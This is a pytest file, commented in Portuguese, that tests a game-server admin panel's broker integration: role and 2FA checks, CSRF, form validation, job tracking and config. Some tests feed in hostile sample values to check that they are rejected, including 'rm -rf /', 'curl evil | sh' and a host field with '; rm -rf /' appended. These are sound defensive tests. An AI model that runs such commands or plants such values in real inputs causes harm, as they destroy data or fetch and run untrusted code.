#!/usr/bin/env python3
"""Testes da integracao do painel com o broker (criar instancia de jogo, abrir portas).

    pytest admin/test_broker.py

O broker de verdade nunca e chamado aqui: as funcoes de `broker_client` sao trocadas por um
falso (`monkeypatch`, que desfaz sozinho). O que se testa e o que e do PAINEL: quem pode
abrir estas telas, o que ele manda pedir, como acompanha uma operacao demorada e o que
cadastra no fim - inclusive quando o fim e ruim.
"""
from __future__ import annotations

import time

import pytest

from gamepanel import app as panel
from gamepanel import navigation as ui
from gamepanel.security import totp


# `broker_required` agora exige o segundo fator DA PESSOA, sempre (ver app.py) - nao so
# quando GAMEPANEL_REQUIRE_2FA esta ligado. Quase todo teste deste arquivo precisa chegar
# ATE a view para testar o que quer testar, entao "chefe" AQUI (e so aqui, por causa deste
# override de fixture) ja vem com o 2FA ativo. Quem quer provar a exigencia em si pede
# `sem_2fa`, mais abaixo.
@pytest.fixture
def chefe(chefe_2fa):
    return chefe_2fa


@pytest.fixture
def sem_2fa(entrar):
    """Um admin comum, sem o segundo fator - o caso que a exigencia do broker barra."""
    panel.ensure_admin_user("sem-2fa", "senha-sem-2fa")
    return entrar("sem-2fa", "senha-sem-2fa")


OP = "a" * 32

JOGOS = [
    {"chave": "alfa", "nome": "Alfa", "app_id": 1001, "portas": ["7001/udp", "7002/udp"],
     "porta_jogo": 7001, "porta_query": 7002, "memoria_mb": 4096, "cores": 2, "disco_gb": 20,
     "receitas": [], "deslocavel": False, "origem": "curado", "criavel": True, "motivo": ""},
    {"chave": "conta", "nome": "Jogo com Conta", "app_id": 1004, "portas": ["7200/udp"],
     "porta_jogo": 7200, "porta_query": 0, "memoria_mb": 4096, "cores": 2, "disco_gb": 20,
     "receitas": [], "deslocavel": False, "origem": "curado", "criavel": False,
     "motivo": "exige conta Steam; use o deploy-game.ps1"},
]

INSTANCIA = {
    "id": 7, "ctid": 300, "ip": "10.0.0.30", "jogo": "alfa", "nome": "Servidor do Zeca",
    "hostname": "alfa-300", "estado": "ativa", "detalhe": "",
    "portas": [{"base": 7001, "numero": 7001, "proto": "udp", "papel": "jogo"},
               {"base": 7002, "numero": 7002, "proto": "udp", "papel": "query"}],
}

RESULTADO = {
    "broker_id": 7, "name": "Servidor do Zeca", "host": "10.0.0.30", "service": "alfa.service",
    "game_port": 7001, "query_port": 7002, "ports": ["7001/udp", "7002/udp"],
    "config_path": "/opt/game/Config", "config_files": ["/opt/game/Config/a.ini"],
    "backup_paths": ["/opt/game/Saves"], "player_source": "log",
    "join_re": r"(?P<name>.+) joined", "leave_re": r"(?P<name>.+) left", "log_path": "",
    "notes": "Criado pelo broker (CT 300)",
}


def recusa(mensagem: str, status: int = 409) -> panel.broker_client.BrokerError:
    return panel.broker_client.BrokerError(mensagem, status)


class BrokerFalso:
    def __init__(self) -> None:
        self.jogos = list(JOGOS)
        self.lista = [dict(INSTANCIA)]
        self.chamadas: list[tuple] = []
        self.erro: Exception | None = None
        self.operacoes: list[dict] = [{"estado": "ok", "log": "tudo certo\n", "resultado": RESULTADO}]
        self.tarefas: list = []

    def _chama(self, nome: str, *args) -> None:
        self.chamadas.append((nome, *args))
        if self.erro is not None:
            raise self.erro

    def catalogo(self):
        self._chama("catalogo")
        return self.jogos

    def adicionar_jogo(self, dados, ator):
        self._chama("adicionar_jogo", dados, ator)
        return {"chave": dados.get("chave")}

    def instancias(self):
        self._chama("instancias")
        return self.lista

    def criar(self, jogo, nome, ator):
        self._chama("criar", jogo, nome, ator)
        return {"operacao_id": OP, "instancia_id": 7}

    def operacao(self, op_id):
        self._chama("operacao", op_id)
        return self.operacoes.pop(0) if len(self.operacoes) > 1 else self.operacoes[0]

    def desativar(self, instancia_id, ator):
        self._chama("desativar", instancia_id, ator)
        return {"id": instancia_id, "estado": "desativada"}

    def remover(self, instancia_id, confirma, ator, somente_banco=False):
        self._chama("remover", instancia_id, confirma, ator, somente_banco)
        return {"id": instancia_id, "removida": True}

    def chamou(self, nome: str) -> list[tuple]:
        return [c for c in self.chamadas if c[0] == nome]


@pytest.fixture
def broker(monkeypatch, banco):
    """Broker ligado no painel e trocado por um falso. As threads NAO sobem: `_dispara`
    guarda a tarefa em `broker.tarefas` para o teste rodar (ou nao) quando quiser."""
    falso = BrokerFalso()
    monkeypatch.setattr(panel, "ALLOW_BROKER", True)
    monkeypatch.setattr(panel, "BROKER_POLL", 0)
    monkeypatch.setattr(panel, "_dispara", falso.tarefas.append)
    for nome in ("catalogo", "adicionar_jogo", "instancias", "criar", "operacao", "desativar", "remover"):
        monkeypatch.setattr(panel.broker_client, nome, getattr(falso, nome))
    return falso


def jobs(banco) -> list:
    return banco.execute("SELECT * FROM jobs ORDER BY id").fetchall()


def novo_job(banco, op: str = OP) -> int:
    with banco:
        cur = banco.execute(
            "INSERT INTO jobs (server_id, target, action, status, command, username, created_at, broker_op)"
            " VALUES (NULL, 'broker', 'broker-criar', 'running', 'alfa: Um', 'chefe', ?, ?)",
            (panel.now_iso(), op))
    return int(cur.lastrowid or 0)


def job(banco, job_id: int):
    return banco.execute("SELECT * FROM jobs WHERE id = ?", (job_id,)).fetchone()


def servidores(banco) -> list:
    return banco.execute("SELECT * FROM servers ORDER BY id").fetchall()


# --------------------------------------------------------------------------- quem abre

ROTAS_GET = ["/catalogo", "/instancias", "/api/catalogo/sugestoes?q=palworld"]
ROTAS_POST = ["/catalogo/novo", "/instancias/nova", "/instancias/7/desativar", "/instancias/7/remover"]


@pytest.mark.parametrize("rota", ROTAS_GET)
def test_operador_leva_403_nas_telas_do_broker(peao, broker, rota):
    assert peao.get(rota).status_code == 403


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_operador_nao_dispara_nada_no_broker(peao, broker, postar, rota):
    assert postar(peao, rota, {"jogo": "alfa", "nome": "x"}).status_code == 403
    assert broker.chamadas == []


@pytest.mark.parametrize("rota", ROTAS_GET)
def test_sem_login_vai_para_o_login(cliente, broker, rota):
    resposta = cliente.get(rota)
    assert resposta.status_code == 302
    assert "/login" in resposta.headers["Location"]


@pytest.mark.parametrize("rota", ROTAS_GET)
def test_broker_desligado_admin_leva_403(chefe, monkeypatch, rota):
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    resposta = chefe.get(rota)
    assert resposta.status_code == 403
    assert "GAMEPANEL_ALLOW_BROKER" in resposta.get_data(as_text=True)


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_broker_desligado_nao_aceita_post(chefe, postar, monkeypatch, rota):
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    assert postar(chefe, rota, {"jogo": "alfa", "nome": "x"}).status_code == 403


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_post_sem_csrf_e_barrado(chefe, broker, rota):
    resposta = chefe.post(rota, data={"jogo": "alfa", "nome": "x"})
    assert resposta.status_code == 400
    assert broker.chamadas == []


def test_menu_so_mostra_o_broker_quando_ligado(chefe, broker, monkeypatch):
    ligado = chefe.get("/").get_data(as_text=True)
    assert 'href="/instancias"' in ligado
    assert 'href="/catalogo"' in ligado
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    desligado = chefe.get("/").get_data(as_text=True)
    assert 'href="/instancias"' not in desligado
    assert 'href="/catalogo"' not in desligado


# --------------------------------------------------- 2FA obrigatorio para falar com o broker

@pytest.mark.parametrize("rota", ["/catalogo", "/instancias"])
def test_sem_2fa_a_tela_manda_para_a_ativacao(sem_2fa, broker, rota):
    resposta = sem_2fa.get(rota)
    assert resposta.status_code == 302
    assert resposta.headers["Location"].endswith("/account/2fa")
    assert broker.chamadas == []


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_sem_2fa_o_post_e_redirecionado_para_a_ativacao_e_nao_chama_o_broker(sem_2fa, broker, postar, rota):
    resposta = postar(sem_2fa, rota, {"jogo": "alfa", "nome": "x"})
    assert resposta.status_code == 302
    assert resposta.headers["Location"].endswith("/account/2fa")
    assert broker.chamadas == []


def test_sem_2fa_a_api_json_responde_403_em_vez_de_redirecionar(sem_2fa, broker):
    resposta = sem_2fa.get("/api/catalogo/sugestoes?q=palworld")
    assert resposta.status_code == 403
    assert "duas etapas" in resposta.get_json()["error"]
    assert broker.chamadas == []


def test_allow_broker_desligado_vence_mesmo_para_quem_nao_tem_2fa(sem_2fa, monkeypatch):
    """A ordem dos dois "guardas" de `broker_required` importa: com o recurso inteiro
    desligado, a mensagem tem de ser sobre isso, nao sobre o 2FA de quem pediu."""
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    resposta = sem_2fa.get("/catalogo")
    assert resposta.status_code == 403
    assert "GAMEPANEL_ALLOW_BROKER" in resposta.get_data(as_text=True)


def test_ativar_o_segundo_fator_libera_as_rotas_do_broker(sem_2fa, broker, postar):
    assert sem_2fa.get("/catalogo").status_code == 302
    sem_2fa.get("/account/2fa")
    with sem_2fa.session_transaction() as sess:
        segredo = sess["totp_pendente"]
    ativado = postar(sem_2fa, "/account/2fa", {"codigo": totp.code(segredo, totp.step_of(time.time()))})
    assert ativado.status_code == 200
    assert sem_2fa.get("/catalogo").status_code == 200


def test_operador_leva_403_antes_mesmo_de_chegar_no_guarda_do_2fa(peao, broker):
    """Admin sem 2FA e barrado; operador (com ou sem 2FA) nem chega la: admin_required
    empilha por fora, entao a mensagem dele e sobre o papel, nao sobre o 2FA."""
    resposta = peao.get("/catalogo")
    assert resposta.status_code == 403
    assert "administradores" in resposta.get_data(as_text=True)


def test_itens_visiveis_filtra_por_recurso_e_papel():
    def chaves(**kw):
        return {i.chave for i in ui.itens_visiveis(ui.NAV_SECUNDARIA, **kw)}

    assert {"instancias", "catalogo"} <= chaves(admin=True, broker=True)
    assert not {"instancias", "catalogo"} & chaves(admin=True, broker=False)
    assert not {"instancias", "catalogo", "usuarios", "novo"} & chaves(admin=False, broker=True)
    assert "ssh" in chaves(admin=False, broker=False)


# ------------------------------------------------------------------------- catalogo

def test_busca_de_jogo_devolve_a_sugestao_com_o_que_o_broker_precisa(chefe, broker):
    resposta = chefe.get("/api/catalogo/sugestoes?q=satisfactory")
    assert resposta.status_code == 200
    dados = resposta.get_json()
    achado = dados["resultados"][0]
    assert achado["valores"]["app_id"] == "1690800"
    assert "8888/tcp" in achado["valores"]["portas"]
    assert "-ReliablePort=8888" in achado["valores"]["start_args"]
    assert achado["avisos"]
    assert "LinuxGSM" in dados["fonte"]


def test_busca_de_jogo_sem_consulta_devolve_lista_vazia(chefe, broker):
    assert chefe.get("/api/catalogo/sugestoes").get_json()["resultados"] == []
    assert chefe.get("/api/catalogo/sugestoes?q=%25%25%25").get_json()["resultados"] == []


def test_busca_nao_chama_o_broker(chefe, broker):
    """E uma lista fixa do repositorio: nada de rede, nem para o broker."""
    chefe.get("/api/catalogo/sugestoes?q=palworld")
    assert broker.chamadas == []


def test_catalogo_traz_o_campo_de_busca(chefe, broker):
    html = chefe.get("/catalogo").get_data(as_text=True)
    assert "data-busca-de-jogo" in html
    assert "/api/catalogo/sugestoes" in html


def test_catalogo_oferece_o_modelo_de_unreal_com_os_valores_na_marcacao(chefe, broker):
    """O seletor nasce escondido e sem `name` (nao vai no envio); o JS le data-valores."""
    html = chefe.get("/catalogo").get_data(as_text=True)
    assert "data-modelo-jogo" in html
    assert "Unreal Engine" in html
    assert "LogNet: Join succeeded" in html
    assert "-log -Port={PORT}" in html


def test_catalogo_lista_os_jogos_e_o_motivo_de_nao_criar(chefe, broker):
    html = chefe.get("/catalogo").get_data(as_text=True)
    assert "Alfa" in html
    assert "criavel" in html
    assert "exige conta Steam" in html


def test_catalogo_com_broker_fora_do_ar_nao_e_500(chefe, broker):
    broker.erro = recusa("nao consegui falar com o broker (ConnectionRefusedError)", 0)
    resposta = chefe.get("/catalogo")
    assert resposta.status_code == 200
    assert "nao consegui falar com o broker" in resposta.get_data(as_text=True)


FORM_JOGO = {
    "chave": "meujogo", "nome": "Meu Jogo", "app_id": "123456", "portas": "7777/udp, 27016/udp",
    "porta_jogo": "7777", "porta_query": "27016", "start_script": "Server.sh",
    "start_args": "-port={PORT}", "memoria_mb": "8192", "cores": "4", "disco_gb": "40",
    "config_path": "/opt/game/Config", "config_files": "/opt/game/Config/a.ini\n/opt/game/Config/b.ini",
    "backup_paths": "/opt/game/Saves", "player_source": "log", "plataforma": "windows",
    "join_re": "(?P<name>.+) joined", "deslocavel": "1",
}


def test_novo_jogo_manda_ao_broker_so_dados_ja_convertidos(chefe, broker, postar):
    dados = {**FORM_JOGO, "receitas": ["wine", "rm -rf /"]}
    resposta = postar(chefe, "/catalogo/novo", dados)
    assert resposta.status_code == 302
    (_, enviado, ator), = broker.chamou("adicionar_jogo")
    assert ator == "chefe"
    assert enviado["app_id"] == 123456
    assert enviado["porta_jogo"] == 7777
    assert enviado["portas"] == ["7777/udp", "27016/udp"]
    assert enviado["config_files"] == ["/opt/game/Config/a.ini", "/opt/game/Config/b.ini"]
    assert enviado["deslocavel"] is True
    assert enviado["receitas"] == ["wine"], "receita fora da lista nem e enviada"
    assert enviado["plataforma"] == "windows"


def test_novo_jogo_nunca_envia_campo_de_comando(chefe, broker, postar):
    """O painel so repassa os campos do formulario: nada que o usuario invente na mao
    (pre_install_cmd, por exemplo) chega ao broker."""
    postar(chefe, "/catalogo/novo", {**FORM_JOGO, "pre_install_cmd": "curl evil | sh",
                                     "post_install_cmd": "reboot"})
    (_, enviado, _), = broker.chamou("adicionar_jogo")
    assert not {"pre_install_cmd", "post_install_cmd"} & set(enviado)


def test_novo_jogo_deixa_rastro_no_historico(chefe, broker, postar, banco):
    postar(chefe, "/catalogo/novo", FORM_JOGO)
    (linha,) = jobs(banco)
    assert (linha["action"], linha["username"], linha["status"]) == ("broker-jogo", "chefe", "ok")
    assert linha["server_id"] is None


@pytest.mark.parametrize("campo", ["app_id", "porta_jogo", "memoria_mb", "cores", "disco_gb"])
@pytest.mark.parametrize("lixo", ["abc", "12.5", "-1", "²", "1 2"])
def test_numero_invalido_nem_chega_ao_broker(chefe, broker, postar, campo, lixo):
    resposta = postar(chefe, "/catalogo/novo", {**FORM_JOGO, campo: lixo})
    assert resposta.status_code == 400
    assert "deve ser um numero" in resposta.get_data(as_text=True)
    assert broker.chamou("adicionar_jogo") == []


def test_recusa_do_broker_volta_ao_formulario_com_o_que_foi_digitado(chefe, broker, postar):
    broker.erro = recusa("start_args: formato invalido", 400)
    resposta = postar(chefe, "/catalogo/novo", {**FORM_JOGO, "start_args": "; reboot"})
    html = resposta.get_data(as_text=True)
    assert resposta.status_code == 400
    assert "start_args: formato invalido" in html
    assert 'value="Server.sh"' in html, "o formulario nao pode perder o que a pessoa digitou"


# ---------------------------------------------------------------------------- instancias

def test_instancias_mostra_a_lista_e_so_jogos_criaveis_no_formulario(chefe, broker):
    html = chefe.get("/instancias").get_data(as_text=True)
    assert "Servidor do Zeca" in html
    assert "10.0.0.30" in html
    assert "7001/udp" in html
    assert 'value="alfa"' in html
    assert 'value="conta"' not in html


def test_instancia_ligada_a_um_servidor_vira_link(chefe, broker, banco):
    panel.ensure_server(panel.ServidorDoDeploy(
        name="Servidor do Zeca", host="10.0.0.30", service="alfa.service", broker_id=7))
    sid = servidores(banco)[0]["id"]
    assert f'href="/servers/{sid}"' in chefe.get("/instancias").get_data(as_text=True)


def test_instancias_com_broker_fora_do_ar(chefe, broker):
    broker.erro = recusa("nao consegui falar com o broker (TimeoutError)", 0)
    resposta = chefe.get("/instancias")
    assert resposta.status_code == 200
    assert "nao consegui falar com o broker" in resposta.get_data(as_text=True)


def test_criar_abre_um_job_sem_servidor_e_redireciona_para_ele(chefe, broker, postar, banco):
    resposta = postar(chefe, "/instancias/nova", {"jogo": "alfa", "nome": "Servidor do Zeca"})
    (linha,) = jobs(banco)
    assert resposta.headers["Location"].endswith(f"/jobs/{linha['id']}")
    assert broker.chamou("criar") == [("criar", "alfa", "Servidor do Zeca", "chefe")]
    assert (linha["action"], linha["status"], linha["broker_op"]) == ("broker-criar", "running", OP)
    assert linha["server_id"] is None
    assert linha["command"] == "alfa: Servidor do Zeca"
    assert len(broker.tarefas) == 1, "o acompanhamento foi disparado uma vez"


def test_criar_recusado_pelo_broker_nao_deixa_job(chefe, broker, postar, banco):
    broker.erro = recusa("limite de 8 instancias atingido", 429)
    resposta = postar(chefe, "/instancias/nova", {"jogo": "alfa", "nome": "x"})
    assert resposta.status_code == 302
    assert "limite de 8 instancias" in chefe.get("/instancias").get_data(as_text=True)
    assert jobs(banco) == []
    assert broker.tarefas == []


def test_criar_sem_id_de_operacao_nao_deixa_job(chefe, broker, postar, banco, monkeypatch):
    monkeypatch.setattr(panel.broker_client, "criar", lambda *a: {})
    postar(chefe, "/instancias/nova", {"jogo": "alfa", "nome": "x"})
    assert jobs(banco) == []


def test_tela_do_job_abre_e_tem_o_rotulo(chefe, broker, postar, banco):
    postar(chefe, "/instancias/nova", {"jogo": "alfa", "nome": "x"})
    (linha,) = jobs(banco)
    html = chefe.get(f"/jobs/{linha['id']}").get_data(as_text=True)
    assert "Instancia criada (broker)" in html
    assert chefe.get(f"/api/jobs/{linha['id']}").get_json()["status"] == "running"


def test_saida_do_job_do_broker_e_so_de_admin(chefe, peao, broker, postar, banco):
    """A saida cita IP, CTID e portas da infraestrutura: operador nem abre nem lista."""
    postar(chefe, "/instancias/nova", {"jogo": "alfa", "nome": "x"})
    (linha,) = jobs(banco)
    assert peao.get(f"/jobs/{linha['id']}").status_code == 403
    assert peao.get(f"/api/jobs/{linha['id']}").status_code == 403
    link = f"/jobs/{linha['id']}"
    assert link in chefe.get("/historico").get_data(as_text=True), "o admin ve o job na lista"
    assert link not in peao.get("/historico").get_data(as_text=True)


# ------------------------------------------------------------- acompanhar a operacao

def test_o_log_aparece_no_job_enquanto_a_operacao_ainda_roda(broker, banco):
    broker.operacoes = [
        {"estado": "executando", "log": "criando o container 300\n"},
        {"estado": "executando", "log": "criando o container 300\ninstalando o jogo\n"},
        {"estado": "ok", "log": "criando o container 300\ninstalando o jogo\npronto\n", "resultado": RESULTADO},
    ]
    job_id = novo_job(banco)
    vistos: list[str] = []
    panel.acompanha_operacao(job_id, OP, dormir=lambda _s: vistos.append(job(banco, job_id)["output"]))
    assert vistos[0] == "criando o container 300\n"
    assert vistos[1].endswith("instalando o jogo\n"), "o progresso apareceu ANTES de terminar"
    assert job(banco, job_id)["status"] == "ok"


def test_operacao_ok_cadastra_o_servidor_e_liga_o_job_a_ele(broker, banco):
    job_id = novo_job(banco)
    panel.acompanha_operacao(job_id, OP, dormir=lambda _s: None)
    (servidor,) = servidores(banco)
    assert (servidor["name"], servidor["host"], servidor["service"]) == ("Servidor do Zeca", "10.0.0.30", "alfa.service")
    assert servidor["broker_id"] == 7
    assert servidor["game_port"] == "7001/udp 7002/udp"
    assert servidor["query_port"] == 7002
    assert servidor["config_files"] == "/opt/game/Config/a.ini"
    assert servidor["backup_paths"] == "/opt/game/Saves"
    assert servidor["player_source"] == "log"
    final = job(banco, job_id)
    assert (final["status"], final["exit_code"], final["server_id"]) == ("ok", 0, servidor["id"])
    assert "Servidor cadastrado no painel" in final["output"]
    assert final["finished_at"]


def test_operacao_com_erro_fecha_o_job_com_o_log_e_nao_cadastra(broker, banco):
    broker.operacoes = [{"estado": "erro", "log": "instalando\nERRO: steamcmd falhou\nreserva liberada\n"}]
    job_id = novo_job(banco)
    panel.acompanha_operacao(job_id, OP, dormir=lambda _s: None)
    final = job(banco, job_id)
    assert (final["status"], final["exit_code"]) == ("error", 1)
    assert "steamcmd falhou" in final["output"]
    assert servidores(banco) == []


@pytest.mark.parametrize("campo", ["host", "service"])
def test_resultado_estranho_do_broker_nao_vira_servidor_e_avisa_que_o_ct_existe(broker, banco, campo):
    ruim = {**RESULTADO, campo: "10.0.0.30; rm -rf /" if campo == "host" else "a b.service"}
    broker.operacoes = [{"estado": "ok", "log": "feito\n", "resultado": ruim}]
    job_id = novo_job(banco)
    panel.acompanha_operacao(job_id, OP, dormir=lambda _s: None)
    final = job(banco, job_id)
    assert final["status"] == "error"
    assert "A instancia foi criada, mas nao consegui cadastra-la" in final["output"]
    assert servidores(banco) == []


def test_resultado_incompleto_tambem_avisa(broker, banco):
    broker.operacoes = [{"estado": "ok", "log": "feito\n", "resultado": {"name": "x"}}]
    job_id = novo_job(banco)
    panel.acompanha_operacao(job_id, OP, dormir=lambda _s: None)
    assert "A instancia foi criada" in job(banco, job_id)["output"]


def test_perder_o_contato_com_o_broker_da_o_job_por_falho(broker, banco, monkeypatch):
    monkeypatch.setattr(panel, "BROKER_FALHAS_MAX", 3)
    broker.erro = recusa("nao consegui falar com o broker (TimeoutError)", 0)
    job_id = novo_job(banco)
    esperas: list[float] = []
    panel.acompanha_operacao(job_id, OP, dormir=esperas.append)
    final = job(banco, job_id)
    assert final["status"] == "error"
    assert "Perdi o contato com o broker" in final["output"]
    assert len(esperas) == 2, "tentou 3 vezes, dormindo entre elas"


def test_falha_isolada_de_contato_nao_derruba_o_acompanhamento(broker, banco, monkeypatch):
    respostas = iter([recusa("nao consegui falar com o broker (TimeoutError)", 0), None])

    def operacao(op_id):
        primeira = next(respostas)
        if primeira is not None:
            raise primeira
        return {"estado": "ok", "log": "feito\n", "resultado": RESULTADO}

    monkeypatch.setattr(panel.broker_client, "operacao", operacao)
    job_id = novo_job(banco)
    panel.acompanha_operacao(job_id, OP, dormir=lambda _s: None)
    assert job(banco, job_id)["status"] == "ok"


def test_tempo_esgotado(broker, banco, monkeypatch):
    monkeypatch.setattr(panel, "JOB_TIMEOUT", -1)
    job_id = novo_job(banco)
    panel.acompanha_operacao(job_id, OP, dormir=lambda _s: None)
    final = job(banco, job_id)
    assert final["status"] == "error"
    assert "Tempo esgotado" in final["output"]


def test_tarefa_disparada_pela_rota_faz_o_caminho_inteiro(chefe, broker, postar, banco):
    postar(chefe, "/instancias/nova", {"jogo": "alfa", "nome": "Servidor do Zeca"})
    broker.tarefas[0]()
    (linha,) = jobs(banco)
    assert linha["status"] == "ok"
    assert servidores(banco)[0]["broker_id"] == 7


# ------------------------------------------------------ retomar depois de um restart

def test_restart_retoma_o_que_ainda_estava_rodando(broker, banco):
    rodando = novo_job(banco, op="b" * 32)
    concluido = novo_job(banco, op="c" * 32)
    with banco:
        banco.execute("UPDATE jobs SET status = 'ok' WHERE id = ?", (concluido,))
        banco.execute("INSERT INTO jobs (target, action, status, username, created_at)"
                      " VALUES ('x', 'restart', 'running', 'u', ?)", (panel.now_iso(),))
    assert panel.retoma_jobs_do_broker() == 1
    assert len(broker.tarefas) == 1
    broker.tarefas[0]()
    assert job(banco, rodando)["status"] == "ok"
    assert broker.chamou("operacao") == [("operacao", "b" * 32)]


def test_broker_desligado_nao_retoma_nada(broker, banco, monkeypatch):
    novo_job(banco)
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    assert panel.retoma_jobs_do_broker() == 0
    assert broker.tarefas == []


# ---------------------------------------------------------- desativar e remover

def test_desativar_pede_ao_broker_e_deixa_rastro(chefe, broker, postar, banco):
    resposta = postar(chefe, "/instancias/7/desativar")
    assert resposta.status_code == 302
    assert broker.chamou("desativar") == [("desativar", 7, "chefe")]
    (linha,) = jobs(banco)
    assert (linha["action"], linha["status"]) == ("broker-desativar", "ok")


def test_desativar_recusado_mostra_o_motivo(chefe, broker, postar, banco):
    broker.erro = recusa("so uma instancia ativa pode ser desativada")
    postar(chefe, "/instancias/7/desativar")
    assert "so uma instancia ativa" in chefe.get("/instancias").get_data(as_text=True)
    assert jobs(banco)[0]["status"] == "error"


def test_remover_apaga_tambem_o_servidor_do_painel(chefe, broker, postar, banco):
    panel.ensure_server(panel.ServidorDoDeploy(
        name="Servidor do Zeca", host="10.0.0.30", service="alfa.service", broker_id=7))
    panel.ensure_server(panel.ServidorDoDeploy(name="Outro", host="10.0.0.99", service="x.service"))
    postar(chefe, "/instancias/7/remover", {"confirma": "Servidor do Zeca"})
    assert broker.chamou("remover") == [("remover", 7, "Servidor do Zeca", "chefe", False)]
    assert [s["name"] for s in servidores(banco)] == ["Outro"], "so o da instancia removida some"


def test_remover_recusado_nao_apaga_o_servidor(chefe, broker, postar, banco):
    panel.ensure_server(panel.ServidorDoDeploy(
        name="Servidor do Zeca", host="10.0.0.30", service="alfa.service", broker_id=7))
    broker.erro = recusa("digite o nome exato da instancia para confirmar", 400)
    postar(chefe, "/instancias/7/remover", {"confirma": "errado"})
    assert len(servidores(banco)) == 1
    assert "nome exato" in chefe.get("/instancias").get_data(as_text=True)


def test_somente_banco_e_repassado(chefe, broker, postar):
    postar(chefe, "/instancias/7/remover", {"confirma": "x", "somente_banco": "1"})
    assert broker.chamou("remover")[0][4] is True


def test_remover_sem_marcar_somente_banco_manda_falso(chefe, broker, postar):
    postar(chefe, "/instancias/7/remover", {"confirma": "x"})
    assert broker.chamou("remover")[0][4] is False


# ------------------------------------------------------------------- esquema e config

def test_colunas_novas_existem(banco):
    servers = {r["name"] for r in banco.execute("PRAGMA table_info(servers)")}
    assert "broker_id" in servers
    assert "broker_op" in {r["name"] for r in banco.execute("PRAGMA table_info(jobs)")}


def test_servidor_cadastrado_a_mao_tem_broker_id_zero(banco):
    panel.ensure_server(panel.ServidorDoDeploy(name="Manual", host="10.0.0.5", service="x.service"))
    assert servidores(banco)[0]["broker_id"] == 0


def test_redeploy_nao_perde_a_ligacao_com_a_instancia(banco):
    dados = panel.ServidorDoDeploy(name="Z", host="10.0.0.30", service="a.service", broker_id=7)
    panel.ensure_server(dados)
    panel.ensure_server(dados._replace(name="Z2"))
    (servidor,) = servidores(banco)
    assert (servidor["name"], servidor["broker_id"]) == ("Z2", 7)


@pytest.fixture
def ambiente_do_broker(monkeypatch, tmp_path):
    token = tmp_path / "token"
    token.write_text("t" * 40 + "\n")
    monkeypatch.setenv("GAMEPANEL_ALLOW_BROKER", "1")
    monkeypatch.setattr(panel, "BROKER_URL", "https://broker.exemplo:8443")
    monkeypatch.setattr(panel, "BROKER_TOKEN_FILE", str(token))
    monkeypatch.setattr(panel, "BROKER_CERT_SHA256", "ab" * 32)
    monkeypatch.setattr(panel.broker_client, "_config", {})
    return token


def test_config_liga_o_broker_com_token_de_arquivo(ambiente_do_broker):
    assert panel._configura_broker() is True
    assert panel.broker_client.configurado()


def test_config_desligada_por_padrao(ambiente_do_broker, monkeypatch):
    monkeypatch.delenv("GAMEPANEL_ALLOW_BROKER")
    assert panel._configura_broker() is False
    assert not panel.broker_client.configurado()


@pytest.mark.parametrize("estrago", ["sem-arquivo", "token-curto", "http-fora-do-loopback", "impressao-ruim"])
def test_config_ruim_desliga_o_recurso_sem_derrubar_o_painel(ambiente_do_broker, monkeypatch, estrago):
    if estrago == "sem-arquivo":
        monkeypatch.setattr(panel, "BROKER_TOKEN_FILE", "/nao/existe")
    elif estrago == "token-curto":
        ambiente_do_broker.write_text("curto")
    elif estrago == "http-fora-do-loopback":
        monkeypatch.setattr(panel, "BROKER_URL", "http://broker.exemplo:8443")
    else:
        monkeypatch.setattr(panel, "BROKER_CERT_SHA256", "isto-nao-e-hex")
    assert panel._configura_broker() is False
